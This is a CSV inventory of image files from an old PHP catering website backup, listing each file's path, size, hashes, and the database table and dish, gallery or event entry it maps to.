6.jpg,old-website-php/Full-website-backup/frontEnd/event/6.jpg,9445,84eef7458c2ab1b4166985c1a6e4c2dd3a2a1b0f2351963d5b7e373c3e4df09b,762dfe91d5f9e395f1594322ceff9e5b,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/event/6.jpg,9445,84eef7458c2ab1b4166985c1a6e4c2dd3a2a1b0f2351963d5b7e373c3e4df09b,762dfe91d5f9e395f1594322ceff9e5b,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpg,old-website-php/Full-website-backup/frontEnd/event/7.jpg,11660,9e63c6f97ebec8a80b17a9c58bc0963f726c59e8b538a92caaa1a74a6f327d6f,19327fb6175e4ec519c1bb27ccff52d2,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/event/7.jpg,11660,9e63c6f97ebec8a80b17a9c58bc0963f726c59e8b538a92caaa1a74a6f327d6f,19327fb6175e4ec519c1bb27ccff52d2,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/event/7.jpg,11660,9e63c6f97ebec8a80b17a9c58bc0963f726c59e8b538a92caaa1a74a6f327d6f,19327fb6175e4ec519c1bb27ccff52d2,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/event/7.jpg,11660,9e63c6f97ebec8a80b17a9c58bc0963f726c59e8b538a92caaa1a74a6f327d6f,19327fb6175e4ec519c1bb27ccff52d2,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/event/7.jpg,11660,9e63c6f97ebec8a80b17a9c58bc0963f726c59e8b538a92caaa1a74a6f327d6f,19327fb6175e4ec519c1bb27ccff52d2,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
1.jpg,old-website-php/Full-website-backup/frontEnd/gallery/1.jpg,11155,e0ed9cdc8786ff6e26778fa51cd0b3dea653c5abe1ea9cfdda5d101bc1620ccb,b443055d57162226aa55942a21dd6cdd,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/gallery/1.jpg,11155,e0ed9cdc8786ff6e26778fa51cd0b3dea653c5abe1ea9cfdda5d101bc1620ccb,b443055d57162226aa55942a21dd6cdd,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/gallery/1.jpg,11155,e0ed9cdc8786ff6e26778fa51cd0b3dea653c5abe1ea9cfdda5d101bc1620ccb,b443055d57162226aa55942a21dd6cdd,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/gallery/1.jpg,11155,e0ed9cdc8786ff6e26778fa51cd0b3dea653c5abe1ea9cfdda5d101bc1620ccb,b443055d57162226aa55942a21dd6cdd,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/gallery/1.jpg,11155,e0ed9cdc8786ff6e26778fa51cd0b3dea653c5abe1ea9cfdda5d101bc1620ccb,b443055d57162226aa55942a21dd6cdd,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/gallery/1.jpg,11155,e0ed9cdc8786ff6e26778fa51cd0b3dea653c5abe1ea9cfdda5d101bc1620ccb,b443055d57162226aa55942a21dd6cdd,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpg,old-website-php/Full-website-backup/frontEnd/gallery/10.jpg,78290,7000d7a5709c6b92d2afb7acbb90c826566a1244dad83a4757b009bb09359a34,f37021d67a75fd8ea82f9171f892be96,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/gallery/10.jpg,78290,7000d7a5709c6b92d2afb7acbb90c826566a1244dad83a4757b009bb09359a34,f37021d67a75fd8ea82f9171f892be96,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/gallery/10.jpg,78290,7000d7a5709c6b92d2afb7acbb90c826566a1244dad83a4757b009bb09359a34,f37021d67a75fd8ea82f9171f892be96,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/gallery/10.jpg,78290,7000d7a5709c6b92d2afb7acbb90c826566a1244dad83a4757b009bb09359a34,f37021d67a75fd8ea82f9171f892be96,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
11.jpg,old-website-php/Full-website-backup/frontEnd/gallery/11.jpg,41573,b7f8b3401f4f88247aea0e2968354be765a9190d1982eeaa0a077bd227985e06,a6e94d4e017d49bc144fa7ff2e0bb67b,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/gallery/11.jpg,41573,b7f8b3401f4f88247aea0e2968354be765a9190d1982eeaa0a077bd227985e06,a6e94d4e017d49bc144fa7ff2e0bb67b,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/gallery/11.jpg,41573,b7f8b3401f4f88247aea0e2968354be765a9190d1982eeaa0a077bd227985e06,a6e94d4e017d49bc144fa7ff2e0bb67b,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/gallery/11.jpg,41573,b7f8b3401f4f88247aea0e2968354be765a9190d1982eeaa0a077bd227985e06,a6e94d4e017d49bc144fa7ff2e0bb67b,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/gallery/11.jpg,41573,b7f8b3401f4f88247aea0e2968354be765a9190d1982eeaa0a077bd227985e06,a6e94d4e017d49bc144fa7ff2e0bb67b,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
12.jpg,old-website-php/Full-website-backup/frontEnd/gallery/12.jpg,68284,1b78503698abc83d3419bd120093d3baa0dd96c689276bead345270db541171a,40f12e4d4e60201dc7faf2144f48a2c9,DB Mapped (Verified),product_item_tbl,12,Besan Dry Fruit Laddo,menu_img
12.jpg,old-website-php/Full-website-backup/frontEnd/gallery/12.jpg,68284,1b78503698abc83d3419bd120093d3baa0dd96c689276bead345270db541171a,40f12e4d4e60201dc7faf2144f48a2c9,DB Mapped (Verified),website_gallery,12,Event at Delhi,gimage
12.jpg,old-website-php/Full-website-backup/frontEnd/gallery/12.jpg,68284,1b78503698abc83d3419bd120093d3baa0dd96c689276bead345270db541171a,40f12e4d4e60201dc7faf2144f48a2c9,DB Mapped (Verified),worke_work_experience,12,North Indian Dishes by2,workproimg
12.jpg,old-website-php/Full-website-backup/frontEnd/gallery/12.jpg,68284,1b78503698abc83d3419bd120093d3baa0dd96c689276bead345270db541171a,40f12e4d4e60201dc7faf2144f48a2c9,DB Mapped (Verified),recipe_appliances_kits,12,Mushroom,kits_img
13.jpg,old-website-php/Full-website-backup/frontEnd/gallery/13.jpg,88617,95f96af40bbe3a1effa392163ce241eaa8e46a8361457a4e110b6567acc25545,9f78d27d8d5c143bd159d8adaa707c6b,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/gallery/13.jpg,88617,95f96af40bbe3a1effa392163ce241eaa8e46a8361457a4e110b6567acc25545,9f78d27d8d5c143bd159d8adaa707c6b,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/gallery/13.jpg,88617,95f96af40bbe3a1effa392163ce241eaa8e46a8361457a4e110b6567acc25545,9f78d27d8d5c143bd159d8adaa707c6b,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,old-website-php/Full-website-backup/frontEnd/gallery/13.jpg,88617,95f96af40bbe3a1effa392163ce241eaa8e46a8361457a4e110b6567acc25545,9f78d27d8d5c143bd159d8adaa707c6b,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,old-website-php/Full-website-backup/frontEnd/gallery/13.jpg,88617,95f96af40bbe3a1effa392163ce241eaa8e46a8361457a4e110b6567acc25545,9f78d27d8d5c143bd159d8adaa707c6b,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
14.jpg,old-website-php/Full-website-backup/frontEnd/gallery/14.jpg,72587,fe69206b96d39c9512d5c65a30b61f230712f511e19ead368fd3ef1776854c22,65b4f761085ae707baa1fabd882eed95,DB Mapped (Verified),product_item_tbl,14,Chhena Murgi,menu_img
14.jpg,old-website-php/Full-website-backup/frontEnd/gallery/14.jpg,72587,fe69206b96d39c9512d5c65a30b61f230712f511e19ead368fd3ef1776854c22,65b4f761085ae707baa1fabd882eed95,DB Mapped (Verified),website_gallery,14,Event at Delhi,gimage
14.jpg,old-website-php/Full-website-backup/frontEnd/gallery/14.jpg,72587,fe69206b96d39c9512d5c65a30b61f230712f511e19ead368fd3ef1776854c22,65b4f761085ae707baa1fabd882eed95,DB Mapped (Verified),worke_work_experience,14,tarters Dishes by12,workproimg
15.jpg,old-website-php/Full-website-backup/frontEnd/gallery/15.jpg,53959,10aa21941931daa54a627ba5e0807ac2d7fe957778548a8958cda0368ed27f84,fa0d448973766eddf3cbebcee7af4ddc,DB Mapped (Verified),product_item_tbl,15,Desi Ghee Bundi,menu_img
15.jpg,old-website-php/Full-website-backup/frontEnd/gallery/15.jpg,53959,10aa21941931daa54a627ba5e0807ac2d7fe957778548a8958cda0368ed27f84,fa0d448973766eddf3cbebcee7af4ddc,DB Mapped (Verified),website_gallery,15,Event at DPS school Gurugram,gimage
15.jpg,old-website-php/Full-website-backup/frontEnd/gallery/15.jpg,53959,10aa21941931daa54a627ba5e0807ac2d7fe957778548a8958cda0368ed27f84,fa0d448973766eddf3cbebcee7af4ddc,DB Mapped (Verified),worke_work_experience,15,Desserts Dishes by1,workproimg
16.jpg,old-website-php/Full-website-backup/frontEnd/gallery/16.jpg,40276,af18d91a4dbfd6656bb66fadfa8aeccaefa4c3addd70d12c6126a36f6db09591,9aaf7a70e48fb5fc6a76c0d6cdd0c2a8,DB Mapped (Verified),product_item_tbl,16,Desi Ghee Bundi Ladoo,menu_img
16.jpg,old-website-php/Full-website-backup/frontEnd/gallery/16.jpg,40276,af18d91a4dbfd6656bb66fadfa8aeccaefa4c3addd70d12c6126a36f6db09591,9aaf7a70e48fb5fc6a76c0d6cdd0c2a8,DB Mapped (Verified),website_gallery,16,Event at DPS school Gurugram,gimage
16.jpg,old-website-php/Full-website-backup/frontEnd/gallery/16.jpg,40276,af18d91a4dbfd6656bb66fadfa8aeccaefa4c3addd70d12c6126a36f6db09591,9aaf7a70e48fb5fc6a76c0d6cdd0c2a8,DB Mapped (Verified),worke_work_experience,16,Desserts Dishes by3,workproimg
17.jpg,old-website-php/Full-website-backup/frontEnd/gallery/17.jpg,38193,7f81fd5fc4545c7f2bc00274f97a37a425c5edd65f4284e349596a37ab7d0614,61729184ed4e6853cf27f7b04691e243,DB Mapped (Verified),product_item_tbl,17,Desi Ghee Gujia,menu_img
17.jpg,old-website-php/Full-website-backup/frontEnd/gallery/17.jpg,38193,7f81fd5fc4545c7f2bc00274f97a37a425c5edd65f4284e349596a37ab7d0614,61729184ed4e6853cf27f7b04691e243,DB Mapped (Verified),website_gallery,17,Event at DPS school Gurugram,gimage
17.jpg,old-website-php/Full-website-backup/frontEnd/gallery/17.jpg,38193,7f81fd5fc4545c7f2bc00274f97a37a425c5edd65f4284e349596a37ab7d0614,61729184ed4e6853cf27f7b04691e243,DB Mapped (Verified),worke_work_experience,17,Desserts Dishes by2,workproimg
18.jpg,old-website-php/Full-website-backup/frontEnd/gallery/18.jpg,81357,7d7c829907f4e5329e5046620023258b74957c88234e244196cd6fab71670617,d71e6e1656dc54a9b78e1b104100fb49,DB Mapped (Verified),menu_item_tbl,18,Aloo Gobhi,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/gallery/18.jpg,81357,7d7c829907f4e5329e5046620023258b74957c88234e244196cd6fab71670617,d71e6e1656dc54a9b78e1b104100fb49,DB Mapped (Verified),product_item_tbl,18,Desi Ghee Patisha,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/gallery/18.jpg,81357,7d7c829907f4e5329e5046620023258b74957c88234e244196cd6fab71670617,d71e6e1656dc54a9b78e1b104100fb49,DB Mapped (Verified),website_gallery,18,event at noida,gimage
18.jpg,old-website-php/Full-website-backup/frontEnd/gallery/18.jpg,81357,7d7c829907f4e5329e5046620023258b74957c88234e244196cd6fab71670617,d71e6e1656dc54a9b78e1b104100fb49,DB Mapped (Verified),worke_work_experience,18,reakfast Dishes by2,workproimg
19.jpg,old-website-php/Full-website-backup/frontEnd/gallery/19.jpg,115693,664ac9f785ce2c64c8b721cbd5521cc10343ced5ee9095b6b05bfa0af40c077a,2ff88b3162cda88eb5e7036482bb975e,DB Mapped (Verified),product_item_tbl,19,Dry Fruit Patisha,menu_img
19.jpg,old-website-php/Full-website-backup/frontEnd/gallery/19.jpg,115693,664ac9f785ce2c64c8b721cbd5521cc10343ced5ee9095b6b05bfa0af40c077a,2ff88b3162cda88eb5e7036482bb975e,DB Mapped (Verified),website_gallery,19,Event at Delhi,gimage
19.jpg,old-website-php/Full-website-backup/frontEnd/gallery/19.jpg,115693,664ac9f785ce2c64c8b721cbd5521cc10343ced5ee9095b6b05bfa0af40c077a,2ff88b3162cda88eb5e7036482bb975e,DB Mapped (Verified),worke_work_experience,19,reakfast Dishes by1,workproimg
2.jpg,old-website-php/Full-website-backup/frontEnd/gallery/2.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/gallery/2.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/gallery/2.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/gallery/2.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/gallery/2.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/gallery/2.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
20.jpg,old-website-php/Full-website-backup/frontEnd/gallery/20.jpg,103349,49ddc503b663f9b1620cb9d52ec1ee3fe195404690474522c9ea36ab6cd0911a,aaa65225df7f5270c3d6b5c37da6a554,DB Mapped (Verified),product_item_tbl,20,Karachi Halwai,menu_img
20.jpg,old-website-php/Full-website-backup/frontEnd/gallery/20.jpg,103349,49ddc503b663f9b1620cb9d52ec1ee3fe195404690474522c9ea36ab6cd0911a,aaa65225df7f5270c3d6b5c37da6a554,DB Mapped (Verified),website_gallery,20,Event at Ghaziabadh,gimage
20.jpg,old-website-php/Full-website-backup/frontEnd/gallery/20.jpg,103349,49ddc503b663f9b1620cb9d52ec1ee3fe195404690474522c9ea36ab6cd0911a,aaa65225df7f5270c3d6b5c37da6a554,DB Mapped (Verified),worke_work_experience,20,Chinese Dishes by,workproimg
21.jpg,old-website-php/Full-website-backup/frontEnd/gallery/21.jpg,74108,63c4808a9fa135fed1a14ea7e6381087b49f61b6430fc1cf198d951e84a35892,960a0a0ca5ca55c105c51bab8ea2fb81,DB Mapped (Verified),product_item_tbl,21,Meva Panjiri,menu_img
21.jpg,old-website-php/Full-website-backup/frontEnd/gallery/21.jpg,74108,63c4808a9fa135fed1a14ea7e6381087b49f61b6430fc1cf198d951e84a35892,960a0a0ca5ca55c105c51bab8ea2fb81,DB Mapped (Verified),website_gallery,21,Event at Ghaziabadh,gimage
21.jpg,old-website-php/Full-website-backup/frontEnd/gallery/21.jpg,74108,63c4808a9fa135fed1a14ea7e6381087b49f61b6430fc1cf198d951e84a35892,960a0a0ca5ca55c105c51bab8ea2fb81,DB Mapped (Verified),worke_work_experience,21,Chinese Dishes by 2,workproimg
22.jpeg,old-website-php/Full-website-backup/frontEnd/gallery/22.jpeg,256231,646827d9e32f45d3687a810520328f817599d3685d61107efac0fd941042b067,a5f2b1e4bfe97023502c78576eb6f3de,DB Mapped (Verified),website_gallery,22,Kesar Ghever,gimage
23.jpeg,old-website-php/Full-website-backup/frontEnd/gallery/23.jpeg,139412,51c12b4b367cf97f545841de91e3a7065e1eb8e2dab3ed2cedb6a68c270c6b2b,240db12492475d8b023900b4549a1054,DB Mapped (Verified),website_gallery,23,Imrtati,gimage
24.jpg,old-website-php/Full-website-backup/frontEnd/gallery/24.jpg,814807,fc314b77114398dbab0f751d8974d34efb6648ac266ff1465a7e5126bd2f67cd,4b1afd70a7cc3dbcd1da064c571c4147,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/gallery/24.jpg,814807,fc314b77114398dbab0f751d8974d34efb6648ac266ff1465a7e5126bd2f67cd,4b1afd70a7cc3dbcd1da064c571c4147,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_small_img
24.jpg,old-website-php/Full-website-backup/frontEnd/gallery/24.jpg,814807,fc314b77114398dbab0f751d8974d34efb6648ac266ff1465a7e5126bd2f67cd,4b1afd70a7cc3dbcd1da064c571c4147,DB Mapped (Verified),product_item_tbl,24,Aam ka Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/gallery/24.jpg,814807,fc314b77114398dbab0f751d8974d34efb6648ac266ff1465a7e5126bd2f67cd,4b1afd70a7cc3dbcd1da064c571c4147,DB Mapped (Verified),website_gallery,24,Amritsari Kulcha,gimage
25.jpg,old-website-php/Full-website-backup/frontEnd/gallery/25.jpg,1201861,e4ed9738d5b3a52df98a9fab6162e7182e9d19d6ac45d3f6c002f9aa4443b68b,545370803e7bccb52461931d354aa846,DB Mapped (Verified),product_item_tbl,25,Hari bhri Mirchi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/gallery/3.jpg,8302,fa807ec7efa2b21a7376b3a996ba77ab07c5aa13e52d176a341c7408079f975c,96b7d4c2b30a44404b92e16e187f9059,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/gallery/3.jpg,8302,fa807ec7efa2b21a7376b3a996ba77ab07c5aa13e52d176a341c7408079f975c,96b7d4c2b30a44404b92e16e187f9059,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/gallery/3.jpg,8302,fa807ec7efa2b21a7376b3a996ba77ab07c5aa13e52d176a341c7408079f975c,96b7d4c2b30a44404b92e16e187f9059,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,old-website-php/Full-website-backup/frontEnd/gallery/3.jpg,8302,fa807ec7efa2b21a7376b3a996ba77ab07c5aa13e52d176a341c7408079f975c,96b7d4c2b30a44404b92e16e187f9059,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,old-website-php/Full-website-backup/frontEnd/gallery/3.jpg,8302,fa807ec7efa2b21a7376b3a996ba77ab07c5aa13e52d176a341c7408079f975c,96b7d4c2b30a44404b92e16e187f9059,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
4.jpg,old-website-php/Full-website-backup/frontEnd/gallery/4.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/gallery/4.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/gallery/4.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/gallery/4.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/gallery/4.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
5.jpg,old-website-php/Full-website-backup/frontEnd/gallery/5.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/gallery/5.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/gallery/5.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/gallery/5.jpg,10554,ac084f58a8bd8024f807640c6c0d635c9908e915fc12ff4b36ffc1fda9d3a40c,9676b73a4f12c277023c4bf8de6286aa,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/gallery/6.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/gallery/6.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/gallery/6.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/gallery/6.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
6.jpg,old-website-php/Full-website-backup/frontEnd/gallery/6.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/gallery/6.jpg,10095,b3f2f45a6304441f46bc0b604290207287810d0f17658bff954f209f86794d4e,a452b281e38f6eb9186a9f314b0fc371,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpeg,old-website-php/Full-website-backup/frontEnd/gallery/7.jpeg,5883,56fd8cd39d5cee6b4b780f1bd44e642d97d63b1aed7a60def924914030931a96,ec04257ca766341e7331a84adaa341f5,DB Mapped (Verified),website_gallery,7,Images 7,gimage
8.jpeg,old-website-php/Full-website-backup/frontEnd/gallery/8.jpeg,5295,afd2abc042ab7eb2aca81f0e7884fbf68e046baca61e4e33bbc2c8ce4324ff13,6b8ea18043982c55b2a010d4d7eb22e2,DB Mapped (Verified),menu_item_tbl,8,Coconut Rice,menu_img
8.jpeg,old-website-php/Full-website-backup/frontEnd/gallery/8.jpeg,5295,afd2abc042ab7eb2aca81f0e7884fbf68e046baca61e4e33bbc2c8ce4324ff13,6b8ea18043982c55b2a010d4d7eb22e2,DB Mapped (Verified),website_gallery,8,Images 8,gimage
9.jpeg,old-website-php/Full-website-backup/frontEnd/gallery/9.jpeg,6875,a382108ea1e1a855f8317f1b0edd2b911ddf3bc4543704975aa1a34611b2f10f,a2a3fc378cdb7cead44a64e8ae3a9282,DB Mapped (Verified),website_gallery,9,Images 9,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1.jpg,337137,f5d1a46bca20679d2527b5b28c02ee57ceee42d13fe59cc57bce8eef1b01e2de,cfbaaae91566fe659da41a24628d3f2b,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1.jpg,337137,f5d1a46bca20679d2527b5b28c02ee57ceee42d13fe59cc57bce8eef1b01e2de,cfbaaae91566fe659da41a24628d3f2b,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1.jpg,337137,f5d1a46bca20679d2527b5b28c02ee57ceee42d13fe59cc57bce8eef1b01e2de,cfbaaae91566fe659da41a24628d3f2b,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1.jpg,337137,f5d1a46bca20679d2527b5b28c02ee57ceee42d13fe59cc57bce8eef1b01e2de,cfbaaae91566fe659da41a24628d3f2b,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1.jpg,337137,f5d1a46bca20679d2527b5b28c02ee57ceee42d13fe59cc57bce8eef1b01e2de,cfbaaae91566fe659da41a24628d3f2b,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1.jpg,337137,f5d1a46bca20679d2527b5b28c02ee57ceee42d13fe59cc57bce8eef1b01e2de,cfbaaae91566fe659da41a24628d3f2b,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
1.png,old-website-php/Full-website-backup/frontEnd/hpbanner/1.png,9590,a5d924ecc782c1b848bcbed2c25ccca16563c23d6c697a5b56badf96e1541ce1,27d4b8e8337d8f7f7dafb63452a2b1e0,DB Mapped (Verified),event_requirement,1,New Year Party,event_img
1742655994_banquet_hall.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742655994_banquet_hall.jpg,867390,211a93e15807aa5fc98d0be8c4ba848dc163fa06e013cfa77fe70fb3954d4e10,c6474691757d457de8f98fe3354b4c9b,Static / Orphaned Disk Asset,,,,
1742656102_banquet_hall.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742656102_banquet_hall.jpg,867390,211a93e15807aa5fc98d0be8c4ba848dc163fa06e013cfa77fe70fb3954d4e10,c6474691757d457de8f98fe3354b4c9b,Static / Orphaned Disk Asset,,,,
1742659223_mommagic_tiffin_achar.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742659223_mommagic_tiffin_achar.jpg,547866,f151f522b5590358a306b453d202b0940525037b63a8f7d20c689674f53971b8,53b5c0c50b0de5cf4ccb94ce4c451563,Static / Orphaned Disk Asset,,,,
1742659288_FoodService_hlwai.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742659288_FoodService_hlwai.jpg,406473,ddafc9cc8eec8f67c13df309b42a11f3e8479d57e99cac7feec8020f043a0c2d,959ad71809e99e720841cfd0fa450fbd,Static / Orphaned Disk Asset,,,,
1742659332_CloudKitchenCatering.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742659332_CloudKitchenCatering.jpg,433700,7443809e92dd40e1f17e5f6b5bb8e84979abc283ad6db540a16e25d77daefa3f,7365bdef94b740b26b54cddb10bfa023,Static / Orphaned Disk Asset,,,,
1742799370_stock-vector-happy-holi-text-with-an-indian-people-celebrating-holi-illustrations-with-an-isolated-background-2268820623.jpg,old-website-php/Full-website-backup/frontEnd/hpbanner/1742799370_stock-vector-happy-holi-text-with-an-indian-people-celebrating-holi-illustrations-with-an-isolated-background-2268820623.jpg,141769,803eb69f832efb072de89be8780a52486119778d9abd15ed8bcbd2d6a312e12e,5196fcf9f5276bb408a101b6f5597d39,Static / Orphaned Disk Asset,,,,
